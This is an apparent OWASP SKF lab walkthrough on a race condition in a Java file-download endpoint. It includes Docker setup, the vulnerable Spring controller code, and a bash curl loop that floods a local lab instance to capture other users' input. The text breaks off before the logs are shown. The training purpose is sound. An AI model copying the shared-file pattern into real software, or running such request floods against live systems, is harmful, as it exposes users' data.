# Race Condition File-Write

## Running the app on Docker

```
$ sudo docker pull blabla1337/owasp-skf-lab:java-racecondition-file-write
```

```
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:java-race-condition-file-write
```

Now that the app is running let's go hacking!

## Reconnaissance

#### Step1

We can download a file from the server by doing a GET request to the server.

Let's try:

![](../../.gitbook/assets/python/RaceCondition-file-write/2.png)

Once we download the file we can see whatever we add to the URL is being written in a file called shared-file.

#### Step 2

As the application suggests, there is a Race condition vulnerability in this app, let's try to find it.

If we look at the code we see that the application gets the query parameter, writes to a file called shared-file.txt, then opens the file and send it back as a response.

```java
public class RaceConditionController {
  @GetMapping("/{value}")
  public ResponseEntity<Object> downloadFile(@PathVariable String value, Model model) throws IOException {
    FileWriter fileWriter = new FileWriter("shared-file.txt", false);
    fileWriter.write(value);
    fileWriter.close();
    File file = new File("shared-file.txt");
    InputStreamResource resource = new InputStreamResource(new FileInputStream(file));
    HttpHeaders headers = new HttpHeaders();
    headers.add("Content-Disposition", String.format("attachment; filename=\"%s\"", file.getName()));
    headers.add("Cache-Control", "no-cache, no-store, must-revalidate");
    headers.add("Pragma", "no-cache");
    headers.add("Expires", "0");
    ResponseEntity<Object> responseEntity = ResponseEntity.ok().headers(headers).contentLength(file.length())
        .contentType(
            MediaType.parseMediaType("application/txt"))
        .body(resource);

    return responseEntity;
  }
}
```

#### Step 3

How can we exploit this?

We have a very small window between the writing of the file:

```java
InputStreamResource resource = new InputStreamResource(new FileInputStream(file));
```

and the response:

```java
HttpHeaders headers = new HttpHeaders();
headers.add("Content-Disposition", String.format("attachment; filename=\"%s\"", file.getName()));
headers.add("Cache-Control", "no-cache, no-store, must-revalidate");
headers.add("Pragma", "no-cache");
headers.add("Expires", "0");
ResponseEntity<Object> responseEntity = ResponseEntity.ok().headers(headers).contentLength(file.length())
    .contentType(MediaType.parseMediaType("application/txt"))
    .body(resource);
return responseEntity;
```

Maybe if we have multiple users on this application at the same time we might be able to intercept someone else's query.

## Exploitation

In order to do that we must send requests with high frequency.

Doing it manually is practically impossible, so we create a script that does that for us:

```sh

#!/bin/bash

while true; do

	curl -i -s -k  -X $'GET' -H $'Host: localhost:5000' $'http://localhost:5000/111' | grep "111"

done

```

and in the meantime we will send a couple requests from Burp:

If we look in the logs we will see:
